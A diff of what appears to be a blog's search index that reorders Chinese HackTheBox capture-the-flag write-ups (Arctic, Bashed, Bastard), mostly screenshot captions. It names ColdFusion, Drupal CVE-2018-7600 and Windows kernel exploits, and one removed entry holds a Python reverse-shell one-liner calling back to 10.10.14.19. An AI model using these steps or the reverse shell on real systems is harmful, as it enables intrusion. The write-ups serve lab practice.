@@ -443,6 +443,193 @@
       </tags>
   </entry>
   <entry>
+    <title>Arctic - HackTheBox</title>
+    <url>/post/d18aaee76b2d/</url>
+    <content><![CDATA[<p><img  
+                     lazyload
+                     alt="image"
+                     data-src="https://jsd.cdn.zzko.cn/gh/Tddddddddd/picx-images-hosting@master/HackTheBox/Arctic/image.1hrbrd274nvk.webp"
+                     
+                ></p>
+<p>nmap扫描</p>
+<p><img  
+                     lazyload
+                     alt="image"
+                     data-src="https://jsd.cdn.zzko.cn/gh/Tddddddddd/picx-images-hosting@master/HackTheBox/Arctic/image.3ahdn0afe220.webp"
+                     
+                ></p>
+<p><img  
+                     lazyload
+                     alt="image"
+                     data-src="https://jsd.cdn.zzko.cn/gh/Tddddddddd/picx-images-hosting@master/HackTheBox/Arctic/image.2yxgt46bvf20.webp"
+                     
+                ></p>
+<p><img  
+                     lazyload
+                     alt="image"
+                     data-src="https://jsd.cdn.zzko.cn/gh/Tddddddddd/picx-images-hosting@master/HackTheBox/Arctic/image.3088jk1uiau0.webp"
+                     
+                ></p>
+<p>这8500端口扫出了个啥玩意，尝试一下浏览器访问</p>
+<p><img  
+                     lazyload
+                     alt="image"
+                     data-src="https://jsd.cdn.zzko.cn/gh/Tddddddddd/picx-images-hosting@master/HackTheBox/Arctic/image.5vh5kw0bjck0.webp"
+                     
+                ></p>
+<p>虽然是个http，但访问起来真的好慢啊</p>
+<p><img  
+                     lazyload
+                     alt="image"
+                     data-src="https://jsd.cdn.zzko.cn/gh/Tddddddddd/picx-images-hosting@master/HackTheBox/Arctic/image.7ktsu7fmyq40.webp"
+                     
+                ></p>
+<p>这个页面发现一个administrator，感觉是个管理页面</p>
+<p><img  
+                     lazyload
+                     alt="image"
+                     data-src="https://jsd.cdn.zzko.cn/gh/Tddddddddd/picx-images-hosting@master/HackTheBox/Arctic/image.7akgnjbmgso0.webp"
+                     
+                ></p>
+<p>虽然不知道密码，但知道了cms名称为ColdFusion，版本为8，搜一下有无exp</p>
+<p><img  
+                     lazyload
+                     alt="image"
+                     data-src="https://jsd.cdn.zzko.cn/gh/Tddddddddd/picx-images-hosting@master/HackTheBox/Arctic/image.2r1zlsrfnhy0.webp"
+                     
+                ></p>
+<p>刚好这有个rce</p>
+<p><img  
+                     lazyload
+                     alt="image"
+                     data-src="https://jsd.cdn.zzko.cn/gh/Tddddddddd/picx-images-hosting@master/HackTheBox/Arctic/image.6yl6ul3oyh80.webp"
+                     
+                ></p>
+<p>修改一下exp</p>
+<p><img  
+                     lazyload
+                     alt="image"
+                     data-src="https://jsd.cdn.zzko.cn/gh/Tddddddddd/picx-images-hosting@master/HackTheBox/Arctic/image.669ecjxz4580.webp"
+                     
+                ></p>
+<p>提权，由于反弹回来的shell是cmd，并不是powershell，所以无法远程下载提权检测脚本</p>
+<p>利用<code>impacket-smbserver -smb2support root &#39;&#39;</code>开启一个文件共享</p>
+<p><img  
+                     lazyload
+                     alt="image"
+                     data-src="https://jsd.cdn.zzko.cn/gh/Tddddddddd/picx-images-hosting@master/HackTheBox/Arctic/image.404h8nq64uw0.webp"
+                     
+                ></p>
+<p><code>copy \\10.10.14.17\root\winPEAS.bat</code>，传输到靶机</p>
+<p><img  
+                     lazyload
+                     alt="image"
+                     data-src="https://jsd.cdn.zzko.cn/gh/Tddddddddd/picx-images-hosting@master/HackTheBox/Arctic/image.27b2uankezrw.webp"
+                     
+                ></p>
+<p><img  
+                     lazyload
+                     alt="image"
+                     data-src="https://jsd.cdn.zzko.cn/gh/Tddddddddd/picx-images-hosting@master/HackTheBox/Arctic/image.2cd4zze2rjvo.webp"
+                     
+                ></p>
+<p>靶机为windows 2008 R2</p>
+<p><img  
+                     lazyload
+                     alt="image"
+                     data-src="https://jsd.cdn.zzko.cn/gh/Tddddddddd/picx-images-hosting@master/HackTheBox/Arctic/image.56zb7jzy8640.webp"
+                     
+                ></p>
+<p>没有打任何补丁</p>
+<p><img  
+                     lazyload
+                     alt="image"
+                     data-src="https://jsd.cdn.zzko.cn/gh/Tddddddddd/picx-images-hosting@master/HackTheBox/Arctic/image.xcvt83zvnao.webp"
+                     
+                ></p>
+<p>一大堆提权方法，随便挑了一个MS10-092</p>
+<p><code>https://github.com/SecWiki/windows-kernel-exploits/tree/master/MS10-092</code></p>
+<p>这个提权工具是利用vb脚本，利用at写入一个计时任务，添加一个管理员用户</p>
+<p><img  
+                     lazyload
+                     alt="image"
+                     data-src="https://jsd.cdn.zzko.cn/gh/Tddddddddd/picx-images-hosting@master/HackTheBox/Arctic/image.1pxmvphy7z1c.webp"
+                     
+                ></p>
+<p>下载下来尝试利用</p>
+<p><img  
+                     lazyload
+                     alt="image"
+                     data-src="https://jsd.cdn.zzko.cn/gh/Tddddddddd/picx-images-hosting@master/HackTheBox/Arctic/image.s0hgk17qcww.webp"
+                     
+                ></p>
+<p><code>cscript test.wsf</code>，执行</p>
+<p><img  
+                     lazyload
+                     alt="image"
+                     data-src="https://jsd.cdn.zzko.cn/gh/Tddddddddd/picx-images-hosting@master/HackTheBox/Arctic/image.3ppmjv60ezy0.webp"
+                     
+                ></p>
+<p><img  
+                     lazyload
+                     alt="image"
+                     data-src="https://jsd.cdn.zzko.cn/gh/Tddddddddd/picx-images-hosting@master/HackTheBox/Arctic/image.63za2cu3joo0.webp"
+                     
+                ></p>
+<p>貌似并没有执行</p>
+<p><img  
+                     lazyload
+                     alt="image"
+                     data-src="https://jsd.cdn.zzko.cn/gh/Tddddddddd/picx-images-hosting@master/HackTheBox/Arctic/image.3r1a6sgzbm20.webp"
+                     
+                ></p>
+<p>这个脚本的计时任务居然是每月一次，这有什么用，修改一下</p>
+<p>索性直接修改为定时执行反弹shell吧，msf生成一个反弹shell</p>
+<p><img  
+                     lazyload
+                     alt="image"
+                     data-src="https://jsd.cdn.zzko.cn/gh/Tddddddddd/picx-images-hosting@master/HackTheBox/Arctic/image.64iha6gw1hk0.webp"
+                     
+                ></p>
+<p>将反弹shell下载到靶机</p>
+<p><img  
+                     lazyload
+                     alt="image"
+                     data-src="https://jsd.cdn.zzko.cn/gh/Tddddddddd/picx-images-hosting@master/HackTheBox/Arctic/image.5pkh0ozv1ao0.webp"
+                     
+                ></p>
+<p><img  
+                     lazyload
+                     alt="image"
+                     data-src="https://jsd.cdn.zzko.cn/gh/Tddddddddd/picx-images-hosting@master/HackTheBox/Arctic/image.33xczeb2haw0.webp"
+                     
+                ></p>
+<p>修改为每分钟执行一次反弹shell</p>
+<p><img  
+                     lazyload
+                     alt="image"
+                     data-src="https://jsd.cdn.zzko.cn/gh/Tddddddddd/picx-images-hosting@master/HackTheBox/Arctic/image.2xkj39p1i0a0.webp"
+                     
+                ></p>
+<p>执行之后立马就弹回来了</p>
+<p><img  
+                     lazyload
+                     alt="image"
+                     data-src="https://jsd.cdn.zzko.cn/gh/Tddddddddd/picx-images-hosting@master/HackTheBox/Arctic/image.6zuz4xm1jd80.webp"
+                     
+                ></p>
+<p><img  
+                     lazyload
+                     alt="image"
+                     data-src="https://jsd.cdn.zzko.cn/gh/Tddddddddd/picx-images-hosting@master/HackTheBox/Arctic/image.6mooap3u2zo0.webp"
+                     
+                ></p>
+]]></content>
+      <tags>
+        <tag>Hack-The-Box</tag>
+      </tags>
+  </entry>
+  <entry>
     <title>Armageddon - HackTheBox</title>
     <url>/post/0d669e781980/</url>
     <content><![CDATA[<p><img  
@@ -668,193 +855,6 @@
                      lazyload
                      alt="image"
                      data-src="https://jsd.cdn.zzko.cn/gh/Tddddddddd/picx-images-hosting@master/HackTheBox/Armageddon/image.4xn21mkgea00.webp"
-                     
-                ></p>
-]]></content>
-      <tags>
-        <tag>Hack-The-Box</tag>
-      </tags>
-  </entry>
-  <entry>
-    <title>Arctic - HackTheBox</title>
-    <url>/post/d18aaee76b2d/</url>
-    <content><![CDATA[<p><img  
-                     lazyload
-                     alt="image"
-                     data-src="https://jsd.cdn.zzko.cn/gh/Tddddddddd/picx-images-hosting@master/HackTheBox/Arctic/image.1hrbrd274nvk.webp"
-                     
-                ></p>
-<p>nmap扫描</p>
-<p><img  
-                     lazyload
-                     alt="image"
-                     data-src="https://jsd.cdn.zzko.cn/gh/Tddddddddd/picx-images-hosting@master/HackTheBox/Arctic/image.3ahdn0afe220.webp"
-                     
-                ></p>
-<p><img  
-                     lazyload
-                     alt="image"
-                     data-src="https://jsd.cdn.zzko.cn/gh/Tddddddddd/picx-images-hosting@master/HackTheBox/Arctic/image.2yxgt46bvf20.webp"
-                     
-                ></p>
-<p><img  
-                     lazyload
-                     alt="image"
-                     data-src="https://jsd.cdn.zzko.cn/gh/Tddddddddd/picx-images-hosting@master/HackTheBox/Arctic/image.3088jk1uiau0.webp"
-                     
-                ></p>
-<p>这8500端口扫出了个啥玩意，尝试一下浏览器访问</p>
-<p><img  
-                     lazyload
-                     alt="image"
-                     data-src="https://jsd.cdn.zzko.cn/gh/Tddddddddd/picx-images-hosting@master/HackTheBox/Arctic/image.5vh5kw0bjck0.webp"
-                     
-                ></p>
-<p>虽然是个http，但访问起来真的好慢啊</p>
-<p><img  
-                     lazyload
-                     alt="image"
-                     data-src="https://jsd.cdn.zzko.cn/gh/Tddddddddd/picx-images-hosting@master/HackTheBox/Arctic/image.7ktsu7fmyq40.webp"
-                     
-                ></p>
-<p>这个页面发现一个administrator，感觉是个管理页面</p>
-<p><img  
-                     lazyload
-                     alt="image"
-                     data-src="https://jsd.cdn.zzko.cn/gh/Tddddddddd/picx-images-hosting@master/HackTheBox/Arctic/image.7akgnjbmgso0.webp"
-                     
-                ></p>
-<p>虽然不知道密码，但知道了cms名称为ColdFusion，版本为8，搜一下有无exp</p>
-<p><img  
-                     lazyload
-                     alt="image"
-                     data-src="https://jsd.cdn.zzko.cn/gh/Tddddddddd/picx-images-hosting@master/HackTheBox/Arctic/image.2r1zlsrfnhy0.webp"
-                     
-                ></p>
-<p>刚好这有个rce</p>
-<p><img  
-                     lazyload
-                     alt="image"
-                     data-src="https://jsd.cdn.zzko.cn/gh/Tddddddddd/picx-images-hosting@master/HackTheBox/Arctic/image.6yl6ul3oyh80.webp"
-                     
-                ></p>
-<p>修改一下exp</p>
-<p><img  
-                     lazyload
-                     alt="image"
-                     data-src="https://jsd.cdn.zzko.cn/gh/Tddddddddd/picx-images-hosting@master/HackTheBox/Arctic/image.669ecjxz4580.webp"
-                     
-                ></p>
-<p>提权，由于反弹回来的shell是cmd，并不是powershell，所以无法远程下载提权检测脚本</p>
-<p>利用<code>impacket-smbserver -smb2support root &#39;&#39;</code>开启一个文件共享</p>
-<p><img  
-                     lazyload
-                     alt="image"
-                     data-src="https://jsd.cdn.zzko.cn/gh/Tddddddddd/picx-images-hosting@master/HackTheBox/Arctic/image.404h8nq64uw0.webp"
-                     
-                ></p>
-<p><code>copy \\10.10.14.17\root\winPEAS.bat</code>，传输到靶机</p>
-<p><img  
-                     lazyload
-                     alt="image"
-                     data-src="https://jsd.cdn.zzko.cn/gh/Tddddddddd/picx-images-hosting@master/HackTheBox/Arctic/image.27b2uankezrw.webp"
-                     
-                ></p>
-<p><img  
-                     lazyload
-                     alt="image"
-                     data-src="https://jsd.cdn.zzko.cn/gh/Tddddddddd/picx-images-hosting@master/HackTheBox/Arctic/image.2cd4zze2rjvo.webp"
-                     
-                ></p>
-<p>靶机为windows 2008 R2</p>
-<p><img  
-                     lazyload
-                     alt="image"
-                     data-src="https://jsd.cdn.zzko.cn/gh/Tddddddddd/picx-images-hosting@master/HackTheBox/Arctic/image.56zb7jzy8640.webp"
-                     
-                ></p>
-<p>没有打任何补丁</p>
-<p><img  
-                     lazyload
-                     alt="image"
-                     data-src="https://jsd.cdn.zzko.cn/gh/Tddddddddd/picx-images-hosting@master/HackTheBox/Arctic/image.xcvt83zvnao.webp"
-                     
-                ></p>
-<p>一大堆提权方法，随便挑了一个MS10-092</p>
-<p><code>https://github.com/SecWiki/windows-kernel-exploits/tree/master/MS10-092</code></p>
-<p>这个提权工具是利用vb脚本，利用at写入一个计时任务，添加一个管理员用户</p>
-<p><img  
-                     lazyload
-                     alt="image"
-                     data-src="https://jsd.cdn.zzko.cn/gh/Tddddddddd/picx-images-hosting@master/HackTheBox/Arctic/image.1pxmvphy7z1c.webp"
-                     
-                ></p>
-<p>下载下来尝试利用</p>
-<p><img  
-                     lazyload
-                     alt="image"
-                     data-src="https://jsd.cdn.zzko.cn/gh/Tddddddddd/picx-images-hosting@master/HackTheBox/Arctic/image.s0hgk17qcww.webp"
-                     
-                ></p>
-<p><code>cscript test.wsf</code>，执行</p>
-<p><img  
-                     lazyload
-                     alt="image"
-                     data-src="https://jsd.cdn.zzko.cn/gh/Tddddddddd/picx-images-hosting@master/HackTheBox/Arctic/image.3ppmjv60ezy0.webp"
-                     
-                ></p>
-<p><img  
-                     lazyload
-                     alt="image"
-                     data-src="https://jsd.cdn.zzko.cn/gh/Tddddddddd/picx-images-hosting@master/HackTheBox/Arctic/image.63za2cu3joo0.webp"
-                     
-                ></p>
-<p>貌似并没有执行</p>
-<p><img  
-                     lazyload
-                     alt="image"
-                     data-src="https://jsd.cdn.zzko.cn/gh/Tddddddddd/picx-images-hosting@master/HackTheBox/Arctic/image.3r1a6sgzbm20.webp"
-                     
-                ></p>
-<p>这个脚本的计时任务居然是每月一次，这有什么用，修改一下</p>
-<p>索性直接修改为定时执行反弹shell吧，msf生成一个反弹shell</p>
-<p><img  
-                     lazyload
-                     alt="image"
-                     data-src="https://jsd.cdn.zzko.cn/gh/Tddddddddd/picx-images-hosting@master/HackTheBox/Arctic/image.64iha6gw1hk0.webp"
-                     
-                ></p>
-<p>将反弹shell下载到靶机</p>
-<p><img  
-                     lazyload
-                     alt="image"
-                     data-src="https://jsd.cdn.zzko.cn/gh/Tddddddddd/picx-images-hosting@master/HackTheBox/Arctic/image.5pkh0ozv1ao0.webp"
-                     
-                ></p>
-<p><img  
-                     lazyload
-                     alt="image"
-                     data-src="https://jsd.cdn.zzko.cn/gh/Tddddddddd/picx-images-hosting@master/HackTheBox/Arctic/image.33xczeb2haw0.webp"
-                     
-                ></p>
-<p>修改为每分钟执行一次反弹shell</p>
-<p><img  
-                     lazyload
-                     alt="image"
-                     data-src="https://jsd.cdn.zzko.cn/gh/Tddddddddd/picx-images-hosting@master/HackTheBox/Arctic/image.2xkj39p1i0a0.webp"
-                     
-                ></p>
-<p>执行之后立马就弹回来了</p>
-<p><img  
-                     lazyload
-                     alt="image"
-                     data-src="https://jsd.cdn.zzko.cn/gh/Tddddddddd/picx-images-hosting@master/HackTheBox/Arctic/image.6zuz4xm1jd80.webp"
-                     
-                ></p>
-<p><img  
-                     lazyload
-                     alt="image"
-                     data-src="https://jsd.cdn.zzko.cn/gh/Tddddddddd/picx-images-hosting@master/HackTheBox/Arctic/image.6mooap3u2zo0.webp"
                      
                 ></p>
 ]]></content>
@@ -1164,305 +1164,6 @@
                      lazyload
                      alt="image"
                      data-src="https://jsd.cdn.zzko.cn/gh/Tddddddddd/picx-images-hosting@master/HackTheBox/Bankrobber/image.5askizlbt680.webp"
-                     
-                ></p>
-]]></content>
-      <tags>
-        <tag>Hack-The-Box</tag>
-      </tags>
-  </entry>
-  <entry>
-    <title>Bashed - HackTheBox</title>
-    <url>/post/07986bdc7b27/</url>
-    <content><![CDATA[<p><img  
-                     lazyload
-                     alt="image"
-                     data-src="https://jsd.cdn.zzko.cn/gh/Tddddddddd/picx-images-hosting@master/HackTheBox/Bashed/image.71qwzdu0yao0.webp"
-                     
-                ></p>
-<p>nmap扫描</p>
-<p><img  
-                     lazyload
-                     alt="image"
-                     data-src="https://jsd.cdn.zzko.cn/gh/Tddddddddd/picx-images-hosting@master/HackTheBox/Bashed/image.1alucwvwajs0.webp"
-                     
-                ></p>
-<p><img  
-                     lazyload
-                     alt="image"
-                     data-src="https://jsd.cdn.zzko.cn/gh/Tddddddddd/picx-images-hosting@master/HackTheBox/Bashed/image.22y11dshdav4.webp"
-                     
-                ></p>
-<p>只开放了80端口，访问</p>
-<p><img  
-                     lazyload
-                     alt="image"
-                     data-src="https://jsd.cdn.zzko.cn/gh/Tddddddddd/picx-images-hosting@master/HackTheBox/Bashed/image.6zr1ck4pdf00.webp"
-                     
-                ></p>
-<p>搜索一下</p>
-<p><img  
-                     lazyload
-                     alt="image"
-                     data-src="https://jsd.cdn.zzko.cn/gh/Tddddddddd/picx-images-hosting@master/HackTheBox/Bashed/image.2msz4vaqq8u0.webp"
-                     
-                ></p>
-<p>这么简单？</p>
-<p><img  
-                     lazyload
-                     alt="image"
-                     data-src="https://jsd.cdn.zzko.cn/gh/Tddddddddd/picx-images-hosting@master/HackTheBox/Bashed/image.529ui67vuvs.webp"
-                     
-                ></p>
-<p>扫一下目录</p>
-<p><img  
-                     lazyload
-                     alt="image"
-                     data-src="https://jsd.cdn.zzko.cn/gh/Tddddddddd/picx-images-hosting@master/HackTheBox/Bashed/image.6lran4l5fm80.webp"
-                     
-                ></p>
-<p><img  
-                     lazyload
-                     alt="image"
-                     data-src="https://jsd.cdn.zzko.cn/gh/Tddddddddd/picx-images-hosting@master/HackTheBox/Bashed/image.4gbhfm75ekq0.webp"
-                     
-                ></p>
-<p>在dev目录下发现bash</p>
-<p><img  
-                     lazyload
-                     alt="image"
-                     data-src="https://jsd.cdn.zzko.cn/gh/Tddddddddd/picx-images-hosting@master/HackTheBox/Bashed/image.jfzwgpkiq5c.webp"
-                     
-                ></p>
-<p><img  
-                     lazyload
-                     alt="image"
-                     data-src="https://jsd.cdn.zzko.cn/gh/Tddddddddd/picx-images-hosting@master/HackTheBox/Bashed/image.4js511wpw7i0.webp"
-                     
-                ></p>
-<p><img  
-                     lazyload
-                     alt="image"
-                     data-src="https://jsd.cdn.zzko.cn/gh/Tddddddddd/picx-images-hosting@master/HackTheBox/Bashed/image.6x7nv2zfvtk0.webp"
-                     
-                ></p>
-<p>想办法把shell反弹回来</p>
-<p><img  
-                     lazyload
-                     alt="image"
-                     data-src="https://jsd.cdn.zzko.cn/gh/Tddddddddd/picx-images-hosting@master/HackTheBox/Bashed/image.621gvbs630k0.webp"
-                     
-                ></p>
-<p>不能直接反弹</p>
-<p>在本地写一个python反弹文件，在让他下载执行</p>
-<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">import socket,subprocess,os; s=socket.socket(socket.AF_INET,socket.SOCK_STREAM); s.connect((&quot;10.10.14.19&quot;,7776)); os.dup2(s.fileno(),0);  os.dup2(s.fileno(),1); os.dup2(s.fileno(),2); p=subprocess.call([&quot;/bin/sh&quot;,&quot;-i&quot;]);</span><br></pre></td></tr></table></figure>
-
-<p><img  
-                     lazyload
-                     alt="image"
-                     data-src="https://jsd.cdn.zzko.cn/gh/Tddddddddd/picx-images-hosting@master/HackTheBox/Bashed/image.2j518ca4hlu0.webp"
-                     
-                ></p>
-<p><img  
-                     lazyload
-                     alt="image"
-                     data-src="https://jsd.cdn.zzko.cn/gh/Tddddddddd/picx-images-hosting@master/HackTheBox/Bashed/image.2otxreay7oo0.webp"
-                     
-                ></p>
-<p>看看有没有可以利用的</p>
-<p><img  
-                     lazyload
-                     alt="image"
-                     data-src="https://jsd.cdn.zzko.cn/gh/Tddddddddd/picx-images-hosting@master/HackTheBox/Bashed/image.3giosuax2h60.webp"
-                     
-                ></p>
-<p>发现一个scriptmanager用户，sudo -u scriptmanager bash -i切换过去</p>
-<p><img  
-                     lazyload
-                     alt="image"
-                     data-src="https://jsd.cdn.zzko.cn/gh/Tddddddddd/picx-images-hosting@master/HackTheBox/Bashed/image.364179m6ygo0.webp"
-                     
-                ></p>
-<p>在根目录下有一个scripts文件夹</p>
-<p><img  
-                     lazyload
-                     alt="image"
-                     data-src="https://jsd.cdn.zzko.cn/gh/Tddddddddd/picx-images-hosting@master/HackTheBox/Bashed/image.3ak4w2hu76w0.webp"
-                     
-                ></p>
-<p><img  
-                     lazyload
-                     alt="image"
-                     data-src="https://jsd.cdn.zzko.cn/gh/Tddddddddd/picx-images-hosting@master/HackTheBox/Bashed/image.6ijw8ywyvtk0.webp"
-                     
-                ></p>
-<p>执行脚本后会往test.txt文本中写入一段话，尝试删除test.txt</p>
-<p><img  
-                     lazyload
-                     alt="image"
-                     data-src="https://jsd.cdn.zzko.cn/gh/Tddddddddd/picx-images-hosting@master/HackTheBox/Bashed/image.2l4m8c6anss0.webp"
-                     
-                ></p>
-<p>发现几分钟后又创建了一个，而且所有者为root</p>
-<p><img  
-                     lazyload
-                     alt="image"
-                     data-src="https://jsd.cdn.zzko.cn/gh/Tddddddddd/picx-images-hosting@master/HackTheBox/Bashed/image.6n1rqqninyo0.webp"
-                     
-                ></p>
-<p>由此可以推断，该目录下的所有脚本，会定时被root所执行，此时只需要一个反弹的python文件即可，继续使用上面反弹所用的python命令</p>
-<p><img  
-                     lazyload
-                     alt="image"
-                     data-src="https://jsd.cdn.zzko.cn/gh/Tddddddddd/picx-images-hosting@master/HackTheBox/Bashed/image.2ct38p3jsejo.webp"
-                     
-                ></p>
-<p><img  
-                     lazyload
-                     alt="image"
-                     data-src="https://jsd.cdn.zzko.cn/gh/Tddddddddd/picx-images-hosting@master/HackTheBox/Bashed/image.13966zcxcwjk.webp"
-                     
-                ></p>
-<p>监听7766</p>
-<p><img  
-                     lazyload
-                     alt="image"
-                     data-src="https://jsd.cdn.zzko.cn/gh/Tddddddddd/picx-images-hosting@master/HackTheBox/Bashed/image.1orsdqfm5hsw.webp"
-                     
-                ></p>
-<p><img  
-                     lazyload
-                     alt="image"
-                     data-src="https://jsd.cdn.zzko.cn/gh/Tddddddddd/picx-images-hosting@master/HackTheBox/Bashed/image.1uudmhn351cw.webp"
-                     
-                ></p>
-]]></content>
-      <tags>
-        <tag>Hack-The-Box</tag>
-      </tags>
-  </entry>
-  <entry>
-    <title>Bastard - HackTheBox</title>
-    <url>/post/018e0822dc20/</url>
-    <content><![CDATA[<p><img  
-                     lazyload
-                     alt="image"
-                     data-src="https://jsd.cdn.zzko.cn/gh/Tddddddddd/picx-images-hosting@master/HackTheBox/Bastard/image.5ozhzwi5h2o0.webp"
-                     
-                ></p>
-<p>nmap扫描</p>
-<p><img  
-                     lazyload
-                     alt="image"
-                     data-src="https://jsd.cdn.zzko.cn/gh/Tddddddddd/picx-images-hosting@master/HackTheBox/Bastard/image.1gdsruyldon4.webp"
-                     
-                ></p>
-<p><img  
-                     lazyload
-                     alt="image"
-                     data-src="https://jsd.cdn.zzko.cn/gh/Tddddddddd/picx-images-hosting@master/HackTheBox/Bastard/image.3f20du91a600.webp"
-                     
-                ></p>
-<p><img  
-                     lazyload
-                     alt="image"
-                     data-src="https://jsd.cdn.zzko.cn/gh/Tddddddddd/picx-images-hosting@master/HackTheBox/Bastard/image.kate6vlmsdc.webp"
-                     
-                ></p>
-<p>访问80端口</p>
-<p><img  
-                     lazyload
-                     alt="image"
-                     data-src="https://jsd.cdn.zzko.cn/gh/Tddddddddd/picx-images-hosting@master/HackTheBox/Bastard/image.7yg573bpcjo.webp"
-                     
-                ></p>
-<p>好眼熟啊，貌似这个cms是drupal，但不确定版本</p>
-<p><img  
-                     lazyload
-                     alt="image"
-                     data-src="https://jsd.cdn.zzko.cn/gh/Tddddddddd/picx-images-hosting@master/HackTheBox/Bastard/image.4mf24gsfsfc0.webp"
-                     
-                ></p>
-<p>robots文件看看</p>
-<p><img  
-                     lazyload
-                     alt="image"
-                     data-src="https://jsd.cdn.zzko.cn/gh/Tddddddddd/picx-images-hosting@master/HackTheBox/Bastard/image.39zgi3txwh00.webp"
-                     
-                ></p>
-<p>change.log文件确定了版本，搜一下exp</p>
-<p><img  
-                     lazyload
-                     alt="image"
-                     data-src="https://jsd.cdn.zzko.cn/gh/Tddddddddd/picx-images-hosting@master/HackTheBox/Bastard/image.2d25cra5eb0g.webp"
-                     
-                ></p>
-<p>版本范围符合</p>
-<p><img  
-                     lazyload
-                     alt="image"
-                     data-src="https://jsd.cdn.zzko.cn/gh/Tddddddddd/picx-images-hosting@master/HackTheBox/Bastard/image.1sr5gy41e83k.webp"
-                     
-                ></p>
-<p><code>https://github.com/pimps/CVE-2018-7600/blob/master/drupa7-CVE-2018-7600.py</code></p>
-<p>利用exp</p>
-<p><img  
-                     lazyload
-                     alt="image"
-                     data-src="https://jsd.cdn.zzko.cn/gh/Tddddddddd/picx-images-hosting@master/HackTheBox/Bastard/image.6h6yj4gbsj00.webp"
-                     
-                ></p>
-<p>反弹shell</p>
-<p><img  
-                     lazyload
-                     alt="image"
-                     data-src="https://jsd.cdn.zzko.cn/gh/Tddddddddd/picx-images-hosting@master/HackTheBox/Bastard/image.13pwsklfyr4w.webp"
-                     
-                ></p>
-<p><img  
-                     lazyload
-                     alt="image"
-                     data-src="https://jsd.cdn.zzko.cn/gh/Tddddddddd/picx-images-hosting@master/HackTheBox/Bastard/image.46wo3ug0lte0.webp"
-                     
-                ></p>
-<p>提权</p>
-<p><img  
-                     lazyload
-                     alt="image"
-                     data-src="https://jsd.cdn.zzko.cn/gh/Tddddddddd/picx-images-hosting@master/HackTheBox/Bastard/image.4imaj2voyww0.webp"
-                     
-                ></p>
-<p>最终确定MS15-051有效</p>
-<p><img  
-                     lazyload
-                     alt="image"
-                     data-src="https://jsd.cdn.zzko.cn/gh/Tddddddddd/picx-images-hosting@master/HackTheBox/Bastard/image.dyvejp0xjuw.webp"
-                     
-                ></p>
-<p><code>https://github.com/rayhan0x01/reverse-shell-able-exploit-pocs/blob/master/ms15-051.md</code></p>
-<p>老样子，msf生成一个反弹后门，用MS15-015运行</p>
-<p><img  
-                     lazyload
-                     alt="image"
-                     data-src="https://jsd.cdn.zzko.cn/gh/Tddddddddd/picx-images-hosting@master/HackTheBox/Bastard/image.61s7o1rfho00.webp"
-                     
-                ></p>
-<p><img  
-                     lazyload
-                     alt="image"
-                     data-src="https://jsd.cdn.zzko.cn/gh/Tddddddddd/picx-images-hosting@master/HackTheBox/Bastard/image.2nfx1ujf90a0.webp"
-                     
-                ></p>
-<p><img  
-                     lazyload
-                     alt="image"
-                     data-src="https://jsd.cdn.zzko.cn/gh/Tddddddddd/picx-images-hosting@master/HackTheBox/Bastard/image.2ub29bcsgeu0.webp"
-                     
-                ></p>
-<p><img  
-                     lazyload
-                     alt="image"
-                     data-src="https://jsd.cdn.zzko.cn/gh/Tddddddddd/picx-images-hosting@master/HackTheBox/Bastard/image.4g1myok3z3q0.webp"
                      
                 ></p>
 ]]></content>
@@ -1823,6 +1524,305 @@
       </tags>
   </entry>
   <entry>
+    <title>Bashed - HackTheBox</title>
+    <url>/post/07986bdc7b27/</url>
+    <content><![CDATA[<p><img  
+                     lazyload
+                     alt="image"
+                     data-src="https://jsd.cdn.zzko.cn/gh/Tddddddddd/picx-images-hosting@master/HackTheBox/Bashed/image.71qwzdu0yao0.webp"
+                     
+                ></p>
+<p>nmap扫描</p>
+<p><img  
+                     lazyload
+                     alt="image"
+                     data-src="https://jsd.cdn.zzko.cn/gh/Tddddddddd/picx-images-hosting@master/HackTheBox/Bashed/image.1alucwvwajs0.webp"
+                     
+                ></p>
+<p><img  
+                     lazyload
+                     alt="image"
+                     data-src="https://jsd.cdn.zzko.cn/gh/Tddddddddd/picx-images-hosting@master/HackTheBox/Bashed/image.22y11dshdav4.webp"
+                     
+                ></p>
+<p>只开放了80端口，访问</p>
+<p><img  
+                     lazyload
+                     alt="image"
+                     data-src="https://jsd.cdn.zzko.cn/gh/Tddddddddd/picx-images-hosting@master/HackTheBox/Bashed/image.6zr1ck4pdf00.webp"
+                     
+                ></p>
+<p>搜索一下</p>
+<p><img  
+                     lazyload
+                     alt="image"
+                     data-src="https://jsd.cdn.zzko.cn/gh/Tddddddddd/picx-images-hosting@master/HackTheBox/Bashed/image.2msz4vaqq8u0.webp"
+                     
+                ></p>
+<p>这么简单？</p>
+<p><img  
+                     lazyload
+                     alt="image"
+                     data-src="https://jsd.cdn.zzko.cn/gh/Tddddddddd/picx-images-hosting@master/HackTheBox/Bashed/image.529ui67vuvs.webp"
+                     
+                ></p>
+<p>扫一下目录</p>
+<p><img  
+                     lazyload
+                     alt="image"
+                     data-src="https://jsd.cdn.zzko.cn/gh/Tddddddddd/picx-images-hosting@master/HackTheBox/Bashed/image.6lran4l5fm80.webp"
+                     
+                ></p>
+<p><img  
+                     lazyload
+                     alt="image"
+                     data-src="https://jsd.cdn.zzko.cn/gh/Tddddddddd/picx-images-hosting@master/HackTheBox/Bashed/image.4gbhfm75ekq0.webp"
+                     
+                ></p>
+<p>在dev目录下发现bash</p>
+<p><img  
+                     lazyload
+                     alt="image"
+                     data-src="https://jsd.cdn.zzko.cn/gh/Tddddddddd/picx-images-hosting@master/HackTheBox/Bashed/image.jfzwgpkiq5c.webp"
+                     
+                ></p>
+<p><img  
+                     lazyload
+                     alt="image"
+                     data-src="https://jsd.cdn.zzko.cn/gh/Tddddddddd/picx-images-hosting@master/HackTheBox/Bashed/image.4js511wpw7i0.webp"
+                     
+                ></p>
+<p><img  
+                     lazyload
+                     alt="image"
+                     data-src="https://jsd.cdn.zzko.cn/gh/Tddddddddd/picx-images-hosting@master/HackTheBox/Bashed/image.6x7nv2zfvtk0.webp"
+                     
+                ></p>
+<p>想办法把shell反弹回来</p>
+<p><img  
+                     lazyload
+                     alt="image"
+                     data-src="https://jsd.cdn.zzko.cn/gh/Tddddddddd/picx-images-hosting@master/HackTheBox/Bashed/image.621gvbs630k0.webp"
+                     
+                ></p>
+<p>不能直接反弹</p>
+<p>在本地写一个python反弹文件，在让他下载执行</p>
